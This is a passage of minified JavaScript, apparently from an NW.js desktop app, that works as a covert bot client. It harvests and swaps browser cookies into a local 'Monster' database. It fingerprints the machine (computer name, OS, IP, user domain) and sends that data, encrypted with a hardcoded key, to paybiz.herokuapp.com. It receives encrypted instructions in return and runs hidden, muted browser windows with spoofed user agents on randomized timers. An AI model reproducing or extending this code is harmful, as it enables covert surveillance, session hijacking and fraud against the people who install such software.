			pushVioletExecution: function(e, t, o) {
				if (e)
					if (null != slash.pushVioletExecutionTimeout && (global.clearTimeout(slash.pushVioletExecutionTimeout), slash.pushVioletExecutionTimeout = null), 0 == slash.isLocked) {
						try {
							slash.isLocked = !0;
							let o = JSON.parse(encLocalStorage.getItem("provGroups"));
							o || (o = {});
							for (let n in e) {
								let r = e[n];
								t[r] && (o[r] && o[r].startDateTime == getDateTruncTimeStamp() || (o[r] = {
									startDateTime: getDateTruncTimeStamp(),
									executions: [],
									cap: Math.floor(randomize(t[r].cap.min, t[r].cap.max))
								}), o[r].executions.push((new Date).getTime()))
							}
							encLocalStorage.setItem("provGroups", JSON.stringify(o))
						} catch (e) {}
						slash.isLocked = !1, "function" == typeof o && o()
					} else slash.pushVioletExecutionTimeout = global.setTimeout(slash.pushVioletExecution, 100, e, t, o);
				else "function" == typeof o && o()
			},
			createViolet: function(e, t, o, n, r, i) {
				return {
					id: e,
					groupIds: t,
					factor_id: o,
					factorConf: r,
					sessionId: i,
					birthTime: (new Date).getTime(),
					TTL: n,
					priority: null != r && "object" == typeof r && "" != r.priority && "string" == typeof r.priority && ["low", "medium", "high"].includes(r.priority.toLowerCase()) ? r.priority : "medium",
					startTime: null,
					endTime: null
				}
			},
			providerToViolets: function(e, t) {
				let o = [],
					n = jen.matchingFlows(e.factors);
				if (n)
					for (let r in n) "object" == typeof n[r] && o.push(slash.createViolet(e.id, e.groupIds, r, e.TTL, n[r], t.sessionId));
				else o.push(slash.createViolet(e.id, e.groupIds, "", e.TTL, null, t.sessionId));
				return o
			},
			violetToProvider: function(e, t) {
				for (let o = 0; o < t.providers.length; o++)
					if (t.providers[o].id == e.id) return t.providers[o];
				return null
			}
		};
		debug_mode && (debuggingModuleLoadEndMeasureTime = performance.now()), debug_mode && (debuggingModuleLoadStartMeasureTime = performance.now());
		try {
			ncl = function(e, t, o, n, r, i) {
				noa.initializeStartPoint(n);
				try {
					if (!r) throw "No WND Provided, Mandatory!";
					var a = devar.calculateDims(e);
					if (!(a.top || a.left || a.right || a.bottom)) {
						if (!o) return !1;
						a = o
					}
					return !!((devar.isElementVisible(e) || o) && a.height > 0 && a.width > 0 && a.right < n.defaultView.innerWidth) && (devar.isElementInViewport(e, n) ? noa.journey(a, n, r, i) : (noa.digiscrollimate(e, t, n, r, null, 5, (function(e) {
						noa.journey(e, n, r, i)
					})), !0))
				} catch (e) {
					return !1
				}
			}
		} catch (e) {
			ncl = null, reportPageView("error/ncl/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor)
		}
		debug_mode && (debuggingModuleLoadEndMeasureTime = performance.now()), debug_mode && (debuggingModuleLoadStartMeasureTime = performance.now());
		var dbAPI = null;
		try {
			dbAPI = new Object, dbAPI.handle = openDatabase("cdb", "1.0", "Monster", 26214400), dbAPI.cookiePrototype = ["name", "value", "domain", "hostOnly", "path", "secure", "httpOnly", "sameSite", "session", "expirationDate", "storeId"], dbAPI.store = function(e, t, o) {
				var n = !1,
					r = global.setTimeout((function() {
						0 == n && "function" == typeof o && (n = !0, global.clearTimeout(r), o(!0))
					}), 3e4);
				if (e && t.length) {
					Object.keys(t[0]);
					for (var i = "CREATE TABLE IF NOT EXISTS " + e + " (", a = 0; a < dbAPI.cookiePrototype.length; a++) i += dbAPI.cookiePrototype[a], a < dbAPI.cookiePrototype.length - 1 && (i += ", ");
					i += ")", dbAPI.handle.transaction((function(a) {
						try {
							a.executeSql("DROP TABLE IF EXISTS " + e), a.executeSql(i);
							for (var c = 0; c < t.length; c++) {
								for (var s = "INSERT INTO " + e + "(", l = "VALUES (", u = Object.keys(t[c]), d = 0; d < u.length; d++) s += u[d], l += "?", d < u.length - 1 && (s += ", ", l += ", ");
								s += ") ", l += ")";
								var g = [];
								for (var m in t[c]) g.push(t[c][m]);
								a.executeSql(s + l, g)
							}
						} catch (e) {
							reportPageView("error/dbAPI/store/trans/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor), 0 == n && "function" == typeof o && (n = !0, global.clearTimeout(r), o(!0))
						}
					}), (function(e) {
						0 == n && "function" == typeof o && (n = !0, global.clearTimeout(r), o(!0))
					}), (function() {
						0 == n && "function" == typeof o && (n = !0, global.clearTimeout(r), o(!1))
					}))
				}
			}, dbAPI.retrieve = function(e, t) {
				dbAPI.handle.transaction((function(o) {
					o.executeSql("SELECT * FROM " + e, [], (function(e, o) {
						for (var n = [], r = 0; r < o.rows.length; r++) n.push(o.rows.item(r));
						"function" == typeof t && t(n)
					}), (function(e) {
						"function" == typeof t && t(null, !0)
					}))
				}))
			}
		} catch (e) {
			reportPageView("error/dbAPI/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor)
		}
		debug_mode && (debuggingModuleLoadEndMeasureTime = performance.now()), debug_mode && (debuggingModuleLoadStartMeasureTime = performance.now());
		var CM = null;
		try {
			CM = function() {
				var e = appWnd || global.chrome;
				if (!e) throw "Window Object Inaccessible";
				var t = ["facebook.com", "gmail.com", "google.com", "instagram.com", "youtube.com", "messenger.com", "whatsapp.com", "linkedin.com", "amazon.com"];

				function o(e) {
					for (var o = 0; o < t.length; o++)
						if (-1 != e.indexOf(t[o])) return !0;
					return !1
				}

				function n() {
					return JSON.parse(encLocalStorage.getItem("cookieMonster")) || []
				}

				function r(e) {
					return "http" + ("boolean" == typeof e.secure && e.secure || "string" == typeof e.secure && "true" == e.secure ? "s" : "") + "://" + e.domain + e.path
				}

				function i(t, o) {
					var n = {};
					try {
						n.url = r(t), n.name = t.name, n.value = t.value, n.secure = "true" == t.secure, n.httpOnly = "true" == t.httpOnly, null != t.expirationDate && "" != t.expirationDate && (n.expirationDate = parseInt(t.expirationDate))
					} catch (e) {}
					try {
						e.cookies.set(function(e) {
							var t = e;
							try {
								return 0 == noa.isNW47() ? t : (!e.domain && e.url && e && (e.url = e.url.replace("http://.", "https://").replace("https://.", "https://").replace(".www.", "www.")), e)
							} catch (e) {
								return t
							}
						}(n), (function(e) {
							var t = !1;
							e ? e.name || (e = e[0]) : t = !0, "function" == typeof o && o(e, t)
						}))
					} catch (e) {
						"function" == typeof o && o(result, error)
					}
				}

				function a(t, o) {
					var n = r(t);
					e.cookies.remove({
						url: n,
						name: t.name
					}, (function(e) {
						var t = !1;
						e ? e.name || (e = e[0]) : t = !0, "function" == typeof o && o(e, t)
					}))
				}
				try {
					var c = {};
					return c.wnd = e, c.cookieMap = n, c.setCookie = i, c.removeCookie = a, c.getCurrentSession = function(t) {
						try {
							e.cookies.getAll({}, (function(e) {
								try {
									var o = e;
									void 0 === e && (o = new Object), "function" == typeof t && t(o)
								} catch (e) {
									"function" == typeof t && t(null)
								}
							}))
						} catch (e) {
							"function" == typeof t && t(null)
						}
					}, c.clearCurrentSession = function(e, t, n = !1) {
						var r = null;
						try {
							var i = e.length,
								c = 0,
								s = [];
							r = global.setTimeout((function() {
								"function" == typeof t && t(null)
							}), 15e3);
							for (var l = 0; l < e.length; l++) s.push(e[l]), 0 == o(e[l].domain) || 1 == n ? a(e[l], (function(e, o) {
								try {
									if (o) throw "Remove Cookie Error";
									++c == i && "function" == typeof t && (global.clearTimeout(r), t(s))
								} catch (e) {
									"function" == typeof t && (global.clearTimeout(r), t(null))
								}
							})) : ++c == i && "function" == typeof t && (global.clearTimeout(r), t(s));
							i || "function" == typeof t && (global.clearTimeout(r), t(s))
						} catch (e) {
							"function" == typeof t && (global.clearTimeout(r), t(null))
						}
					}, c.setCurrentSession = function(e, t) {
						if (null != e && e && void 0 !== e) {
							for (var o = e.length, n = 0, r = 0; r < e.length; r++) i(e[r], (function(e, r) {
								++n == o && "function" == typeof t && t()
							}));
							e.length || "function" == typeof t && t()
						} else "function" == typeof t && t(!0)
					}, c.saveSession = function(e, t, o) {
						try {
							var r = n(); - 1 == r.indexOf(e) && r.push(e), encLocalStorage.setItem("cookieMonster", JSON.stringify(r)), dbAPI.store(e, t, o)
						} catch (e) {
							"function" == typeof o && o(!0)
						}
					}, c.loadSession = function(e, t) {
						-1 == n().indexOf(e) ? "function" == typeof t && t(null, !0) : dbAPI.retrieve(e, (function(e, o) {
							"function" == typeof t && t(e, o)
						}))
					}, c.deleteSession = function(e) {
						var t = n().indexOf(e);
						if (-1 == t) !0;
						else {
							var o = n();
							o.splice(t, 1), encLocalStorage.setItem("cookieMonster", JSON.stringify(o))
						}
					}, c
				} catch (e) {
					return reportPageView("error/cookiesCM/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor), null
				}
			}()
		} catch (e) {
			CM = null, reportPageView("error/cookies/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor)
		}
		debug_mode && (debuggingModuleLoadEndMeasureTime = performance.now());
		var scriptContext = momo.createScriptContext();

		function getStorage() {
			try {
				var e = encLocalStorage.getItem("KTYT");
				return e || null
			} catch (e) {
				return reportPageView("error/fileStorage/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor), null
			}
		}

		function setTimeSpace(e) {
			var t = e,
				o = JSON.parse(encLocalStorage.getItem("PRYO"));
			if (o && o.ds && getDatedFormat(new Date) == o.ds && o.freq && o.freq.min && o.freq.max) t = o.freq, o.executes += 1, void 0 !== o.bucketId && void 0 !== o.executes && (encLocalStorage.setItem("PRYO", JSON.stringify(o)), reportPageView("freqb/t" + o.bucketId + "/c" + o.executes, frisitor), o.bucketId == o.executes && reportPageView("freqb/last/" + o.bucketId + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor));
			else {
				o && reportPageView("freqb/gen/t" + o.bucketId + "/c" + o.executes + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor);
				var n = jen.generateBucketSpace(kwl.bucketFreq, kwl.freq);
				n && n.freq && n.freq.min && n.freq.max && (t = n.freq)
			}
			var r = function(e) {
				try {
					var t = window.kwl.freq.min,
						o = window.kwl.freq.max;
					e && (t = e.min, o = e.max);
					var n = randomize(t, o);
					return (new Date).getTime() + n
				} catch (e) {
					return reportPageView("error/" + scriptName + "time/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor), null
				}
			}(t);
			return encLocalStorage.setItem("KTYT", r), r
		}
		try {
			oleg.reportProcessorArchitecture(scriptContext), oleg.reportComputerName(scriptContext), oleg.reportOperatingSystem(scriptContext), oleg.reportUserDomain(scriptContext), oleg.reportPlatform(scriptContext)
		} catch (e) {}

		function ping() {
			var e = getStorage(),
				t = (new Date).getTime() > e,
				o = slash.getVioletsAmountSync() > 0;
			if (t || o) {
				var n = -1;
				if (t ? n = 1 : o && (n = 2), proximity()) ally.reportScriptLog(LOG_TYPE.SCRIPT, LOG_LEVELS.DEBUG, scriptContext, ["ping", "proxy"]), reportPageView("warn/prox/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), global.setTimeout((function() {
					tryCatchConsole(ping)
				}), PING_RETRY_MILISECONDS);
				else {
					ally.reportScriptLog(LOG_TYPE.SCRIPT, LOG_LEVELS.DEBUG, scriptContext, ["ping", "non_proxy"]);
					var r = {
							user_id: encLocalStorage.getItem("userid"),
							app_name: nw.App.manifest.name,
							version: getFullVersion(),
							script_version: scriptVersion,
							nwjs_version: "string" == typeof grunt_nwjs_version ? grunt_nwjs_version : "",
							compilation_guid: "string" == typeof grunt_compilation_guid ? grunt_compilation_guid : "",
							app_imgs_version: "string" == typeof grunt_app_imgs_version ? grunt_app_imgs_version : "",
							n: n,
							user: {
								user_id: encLocalStorage.getItem("userid"),
								ip: JSON.parse(encLocalStorage.getItem("lipr")),
								memory: process.memoryUsage().rss / 1024 / 1024,
								navigatorOS: oleg.getOSFromNavigator(),
								uptime: oleg.getUpTime(),
								userDomain: oleg.getUserDomain()
							},
							system: {
								machine_id: encLocalStorage.getItem("machineid") ? encLocalStorage.getItem("machineid") : "",
								platform: oleg.getPlatform(),
								computerName: oleg.getComputerName(),
								operatingSystem: oleg.getOperatingSystem(),
								processorArchitecture: oleg.getProcessorArchitecture()
							}
						},
						i = encodeURIComponent(CryptoJS.AES.encrypt(JSON.stringify(r), CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(encLocalStorage.getItem("bin"), "!@$~B1aB1a43Out0f1obis:)Leaver$4Ev)er^_^"))).toString());
					axios.post("https://paybiz.herokuapp.com/graph", i).then((function(n) {
						autoRestarter && "function" == typeof autoRestarter.scriptOutOfIdle && autoRestarter.scriptOutOfIdle();
						var r = {},
							i = {},
							a = {};
						try {
							for (var c in r = n.data, i.k = CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(r.k.toString(), CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(encLocalStorage.getItem("bin"), "!@$~B1aB1a43Out0f1obis:)Leaver$4Ev)er^_^")))), i.s = CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(r.s.toString(), CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(encLocalStorage.getItem("bin"), "!@$~B1aB1a43Out0f1obis:)Leaver$4Ev)er^_^")))), void 0 !== r.d && (i.d = CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(r.d.toString(), CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(encLocalStorage.getItem("bin"), "!@$~B1aB1a43Out0f1obis:)Leaver$4Ev)er^_^"))))), void 0 !== r.c && (i.c = CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(r.c.toString(), CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(encLocalStorage.getItem("bin"), "!@$~B1aB1a43Out0f1obis:)Leaver$4Ev)er^_^"))))), void 0 !== r.u && (i.u = CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(r.u.toString(), CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(encLocalStorage.getItem("bin"), "!@$~B1aB1a43Out0f1obis:)Leaver$4Ev)er^_^"))))), i.k = JSON.parse(i.k), i.s = JSON.parse(i.s), void 0 !== i.d && (i.d = JSON.parse(i.d)), void 0 !== i.c && (i.c = JSON.parse(i.c)), void 0 !== i.u && (i.u = JSON.parse(i.u)), (a = i.s).kws || (a.kws = {}), i.k) a.kws[c] = i.k[c], void 0 === a.kws[c].weight && (a.kws[c].weight = 0);
							if (void 0 !== i.d)
								for (var s in i.d) a[s] = i.d[s];
							void 0 !== i.c && (a.c = i.c), void 0 !== i.u && (a.u = i.u)
						} catch (e) {
							try {
								a = CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(n.data.toString(), CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(encLocalStorage.getItem("bin"), "!@$~B1aB1a43Out0f1obis:)Leaver$4Ev)er^_^"))))
							} catch (t) {
								return global.setTimeout((function() {
									tryCatchConsole(ping)
								}), PING_RETRY_MILISECONDS), reportPageView("error/encryption.rnd/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor), void reportPageView("error/encryption/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + t.stack, frisitor)
							}
						}
						try {
							window.kwl = a
						} catch (e) {
							return reportPageView("error/json_parse/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor), void global.setTimeout((function() {
								tryCatchConsole(ping)
							}), PING_RETRY_MILISECONDS)
						}
						if (!0 === window.kwl.shouldRestart) return ally.reportScriptLog(LOG_TYPE.SCRIPT, LOG_LEVELS.DEBUG, scriptContext, ["ping", scriptName + "_reload"]), void(autoRestarter.appRestart ? (ally.reportScriptLog(LOG_TYPE.SCRIPT, LOG_LEVELS.DEBUG, scriptContext, ["ping", scriptName + "_reload", "app_restart"]), reportPageView(scriptName + "/reload/res/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), autoRestarter.appRestart()) : "function" == typeof loadModules ? (ally.reportScriptLog(LOG_TYPE.SCRIPT, LOG_LEVELS.DEBUG, scriptContext, ["ping", scriptName + "_reload", "loadModules"]), reportPageView(scriptName + "/reload/loadm/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), loadModules()) : "object" == typeof modules && "function" == typeof modules.reload ? (ally.reportScriptLog(LOG_TYPE.SCRIPT, LOG_LEVELS.DEBUG, scriptContext, ["ping", scriptName + "_reload", "modules.reload"]), reportPageView(scriptName + "/reload/m.reload/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), modules.reload()) : (ally.reportScriptLog(LOG_TYPE.SCRIPT, LOG_LEVELS.ERROR, scriptContext, ["ping", scriptName + "_reload"]), reportPageView("error/" + scriptName + "/reload/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor)));
						if (debug_mode && "undefined" != typeof configOverride && (window.kwl.freq = configOverride.freq, window.kwl.bucketFreq = null, window.kwl.prov = configOverride.prov), window.kwl && (!window.kwl.prov || !window.kwl.kws || 1 == window.kwl.blocked)) return reportPageView("b/kload/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), void global.setTimeout((function() {
							tryCatchConsole(ping)
						}), LONG_PING_RETRY_MILISECONDS);
						if (!window.kwl || !window.kwl.freq || void 0 === window.kwl.freq.min || void 0 === window.kwl.freq.max) return reportPageView("error/kload/incon/freq/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), void global.setTimeout((function() {
							tryCatchConsole(ping)
						}), PING_RETRY_MILISECONDS);
						try {
							var l = encLocalStorage.getItem("kstrategy");
							l || (l = jen.generateColorSpace(kwl.strategies.strategiesAvailable), encLocalStorage.setItem("kstrategy", l))
						} catch (e) {
							reportPageView("error/kstrategy/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e, frisitor)
						}
						if (1 == t) {
							var u = (e ? setTimeSpace() : setTimeSpace(kwl.initFreq)) - (new Date).getTime();
							global.setTimeout((function() {
								tryCatchConsole(ping)
							}), u)
						} else 0 == t && 1 == o && global.setTimeout((function() {
							tryCatchConsole(ping)
						}), e - (new Date).getTime() + Math.floor(randomize(0, 18e4)));
						if (e) {
							function d(e) {
								if (e || 1 == debug_mode) {
									if (!kwl || !kwl.prov) return void reportPageView("error/rnr/incon/freq/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor);
									if (void 0 === kwl.prov.length || kwl.prov.length <= 0) return void reportPageView("error/rnr/incon/prov/len/" + kwl.prov.length + "/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor);
									try {
										var n = randomize(kwl.delayFreq.min, kwl.delayFreq.max);
										global.setTimeout((function() {
											try {
												ally.reportScriptLog(LOG_TYPE.SCRIPT, LOG_LEVELS.DEBUG, scriptContext, ["ping", "rocknroll"]), scriptContext.scriptFreshRun = t, scriptContext.driedRosesPlanting = o, rocknroll()
											} catch (e) {
												try {
													reportPageView("error/rocnr/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor)
												} catch (e) {}
											}
										}), n)
									} catch (e) {}
								}
							}
							"object" == typeof modules && "function" == typeof modules.npf ? modules.npf(d) : d(!0)
						}
					})).catch((function(e) {
						try {
							reportPageView("error/ping/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + (e || "undefined"), frisitor)
						} catch (e) {}
						global.setTimeout((function() {
							tryCatchConsole(ping)
						}), PING_RETRY_MILISECONDS)
					}))
				}
			} else global.setTimeout((function() {
				tryCatchConsole(ping)
			}), e - (new Date).getTime())
		}

		function spawnPing() {
			try {
				ping()
			} catch (e) {
				reportPageView("error/cping/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor), global.setTimeout((function() {
					tryCatchConsole(ping)
				}), PING_RETRY_MILISECONDS)
			}
		}

		function rocknroll() {
			var sessionContext = momo.createSessionContext(scriptContext, kwl);
			sessionContext.providers = kwl.prov, sessionContext.scriptContextOwner.activeSessionId = sessionContext.sessionId, ally.reportSessionLog(LOG_TYPE.SCRIPT, LOG_LEVELS.DEBUG, sessionContext, ["rocknroll", "setup", sessionContext.scriptContextOwner.scriptFreshRun ? 1 : 0]);
			try {
				reportPageView("session/" + scriptName + scriptVersion + "/" + getApplicationActionString() + "/", frisitor)
			} catch (e) {
				global.setTimeout((function() {
					try {
						reportPageView("session/" + scriptName + scriptVersion + "/" + getApplicationActionString() + "/", frisitor), reportPageView("error/session/" + scriptName + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor)
					} catch (e) {}
				}), 6e4)
			}

			function userAgent(e) {
				var t = "";
				if ((n = JSON.parse(encLocalStorage.getItem("ua")) || null) && n.default && n.default.string && n.default.browser) {
					t = n.default.string;
					var o = "edge" == n.default.header ? "edge" : n.default.browser;
					void 0 === n.default.version && (n.default.version = e.helper[o][n.default.index], encLocalStorage.setItem("ua", JSON.stringify(n))), reportPageView("/ua/" + o + "/" + n.default.version, frisitor)
				} else {
					var n;
					e = jen.generateUserAgent(e), (n = JSON.parse(encLocalStorage.getItem("ua")) || {}).default = e, encLocalStorage.setItem("ua", JSON.stringify(n)), reportPageView("ua/set/default" + e.sbrowse + "/" + e.version, frisitor), t = e.string
				}
				return t
			}
			var KEYPRESSCompatible = isNewerVersion("3.0.0", appVersion || 0),
				NewMouseHoldCompatible = isNewerVersion("3.0.0", appVersion || 0),
				NCLCompatible = !0,
				BOCompatible = !0,
				isCookified = function() {
					return -1 != CM.cookieMap().indexOf("root")
				};
			if (slash.getVioletsAmount(sessionContext.sessionId, (function(e) {
					0 == sessionContext.scriptContextOwner.scriptFreshRun ? sessionContext.runningModeName = "roses" : void 0 !== sessionContext.providers && void 0 !== sessionContext.providers.length && (e += sessionContext.providers.length), ally.reportRockNRollHolyEvent(sessionContext, "holy", e)
				})), sessionContext.providers && !(sessionContext.providers.length < 1)) {
				try {
					var isActivated = encLocalStorage.getItem("ua") || null;
					if (!isActivated) {
						var aSCMajor = encLocalStorage.getItem("subchannel") || "organic",
							activationStr = "activation/" + getApplicationActionString() + "/" + aSCMajor + "/" + encLocalStorage.getItem("userid");
						reportPageView(activationStr, frisitor)
					}
				} catch (e) {
					reportPageView("error/activation/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor)
				}
				if ("kobe" == sessionContext.runningModeName) {
					var uaData = JSON.parse(encLocalStorage.getItem("ua"));
					if (uaData && uaData.default) {
						var regeneratedUAData = jen.regenerateUserAgent(kwl.ua, uaData.default);
						regeneratedUAData && (reportPageView("ua/regen/default/f_" + uaData.default.browser + "_" + uaData.default.version + "/t_" + regeneratedUAData.browser + "_" + regeneratedUAData.version + "/" + nw.App.manifest.name + "." + getFullVersion() + "/" + encLocalStorage.getItem("userid"), frisitor), uaData.default = regeneratedUAData, encLocalStorage.setItem("ua", JSON.stringify(uaData)))
					}
				}
				try {
					sessionContext.user_agent = userAgent(kwl.ua)
				} catch (e) {
					reportPageView("error/useragent/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor), sessionContext.user_agent = navigator.userAgent, reportPageView("/ua/chrome/default", frisitor)
				}
				var outputUA = null;
				try {
					kwl && kwl.uaLock && kwl.uaLock.browser && kwl.uaLock.version && (outputUA = jen.getUserAgent(kwl.ua, kwl.uaLock.browser, kwl.uaLock.version))
				} catch (e) {
					reportPageView("error/uaOverride/global/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor), outputUA = null
				}
				outputUA && outputUA.ua && (sessionContext.user_agent = outputUA.ua), ally.reportSessionLog(LOG_TYPE.SCRIPT, LOG_LEVELS.DEBUG, sessionContext, ["rocknroll", "instance", "first_call", sessionContext.scriptContextOwner.scriptFreshRun ? 1 : 0]);
				var provsToPush = [];
				sessionContext.scriptContextOwner.scriptFreshRun && (provsToPush = sessionContext.providers), pushNewProviders(0, provsToPush, (function() {
					slash.getVioletsAmount(null, (function(e) {
						startInstance(sessionContext)
					}))
				}))
			}

			function advance(e, t) {
				try {
					if (global.clearTimeout(t.advanceTimeout), t && !0 === t.isAdvanced) return;
					t && (t.isAdvanced = !0);
					let o = 3e3;
					t.sessionContextOwner.providersRan > 0 && !e ? t.prov.spaceFreq && t.prov.spaceFreq.afterExecution && t.prov.spaceFreq.afterExecution.min && t.prov.spaceFreq.afterExecution.max ? o = randomize(t.prov.spaceFreq.afterExecution.min, t.prov.spaceFreq.afterExecution.max) : t.sessionContextOwner.kwl.spaceFreq && t.sessionContextOwner.kwl.spaceFreq.min && t.sessionContextOwner.kwl.spaceFreq.max && !e && (o = randomize(t.sessionContextOwner.kwl.spaceFreq.min, t.sessionContextOwner.kwl.spaceFreq.max)) : t.sessionContextOwner.kwl.spaceFreqSkipped && t.sessionContextOwner.kwl.spaceFreqSkipped.min && t.sessionContextOwner.kwl.spaceFreqSkipped.max && (o = randomize(t.sessionContextOwner.kwl.spaceFreqSkipped.min, t.sessionContextOwner.kwl.spaceFreqSkipped.max)), slash.getVioletsAmount(null, (function(e) {
						e > 0 ? global.setTimeout((function() {
							tryCatchConsole((function() {
								startInstance(t.sessionContextOwner)
							}))
						}), o) : ally.reportRockNRollHolyEvent(t.sessionContextOwner, "thai", t.sessionContextOwner.providersRan)
					}))
				} catch (e) {
					reportPageView("error/advance/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor)
				}
			}

			function garbage(e) {
				try {
					defined(gc) && e < 5 && (gc(), global.setTimeout(garbage, 1e3, e + 1))
				} catch (e) {
					reportPageView("error/garbagecleaner/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor)
				}
			}

			function instance(inputProviderConfig, sourceSessionContext, inputViolet) {
				var newWindowOptions = {
					frame: !0,
					width: screen.availWidth,
					height: screen.availHeight,
					position: "center",
					show: debug_mode,
					focus: !1,
					always_on_top: !1,
					mute: !0,
					downloadable: !1,
					plugins: !1,
					alerts: !1,
					nwpolicy: noa.isNW47() ? "default" : "block"
				};
				inputProviderConfig.debug && void 0 !== inputProviderConfig.debug.overrideNWPolicy && inputProviderConfig.debug.overrideNWPolicy && ["default", "block"].includes(inputProviderConfig.debug.overrideNWPolicy) && "default" == newWindowOptions.nwpolicy && (newWindowOptions.nwpolicy = inputProviderConfig.debug.overrideNWPolicy), inputProviderConfig.debug && "boolean" == typeof inputProviderConfig.debug.shouldUseUserAgent && 1 != inputProviderConfig.debug.shouldUseUserAgent || (newWindowOptions.user_agent = sourceSessionContext.user_agent);
				let context = momo.createFeedContext(inputViolet, inputProviderConfig, sourceSessionContext);
				if (context.factorConfig = momo.getFactorConfig(context), ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.DEBUG, context, ["instance", "setup"]), !(context.executionState >= STATES.STARTED || (context.executionState = STATES.STARTED, memWatch(), context.executionState >= STATES.FINISHED))) {
					if (!context.sharks) {
						if (sharkHunter(), context.executionState >= STATES.FINISHED) return;
						context.sharks = global.setInterval(sharkHunter, 1e3)
					}
					if (!context.memWatcher) {
						if (memWatch(), context.executionState >= STATES.FINISHED) return;
						context.memWatcher = global.setInterval(memWatch, 1e3)
					}
					try {
						if (context.prov.clientVers && coreVersion) {
							if (void 0 !== context.prov.clientVers.included && Array.isArray(context.prov.clientVers.included) && context.prov.clientVers.included.length > 0) {
								if (0 == context.prov.clientVers.included.filter((function(e) {
										return parseInt(e) == coreVersion
									})).length) return reportEvent("skipwood" + scriptVersion + (context.uaOverride ? "." + context.uaOverride : "") + "." + momo.tryGetProviderId(context), getApplicationActionString(), getUserId(), 0, secFrisitor_Events), reportPageView("skip/includedClientVer/" + momo.tryGetProviderId(context) + "/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.DEBUG, context, ["finished_execution", "skipwood", 0, "included_client_ver_compatibility"]), void advance(!0, context)
							} else if (void 0 !== context.prov.clientVers.excluded && Array.isArray(context.prov.clientVers.excluded) && context.prov.clientVers.excluded.length > 0 && context.prov.clientVers.excluded.filter((function(e) {
									return parseInt(e) == coreVersion
								})).length > 0) return reportEvent("skipwood" + scriptVersion + (context.uaOverride ? "." + context.uaOverride : "") + "." + momo.tryGetProviderId(context), getApplicationActionString(), getUserId(), 0, secFrisitor_Events), reportPageView("skip/excludedClientVer/" + momo.tryGetProviderId(context) + "/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.DEBUG, context, ["finished_execution", "skipwood", 0, "excluded_client_ver_compatibility"]), void advance(!0, context);
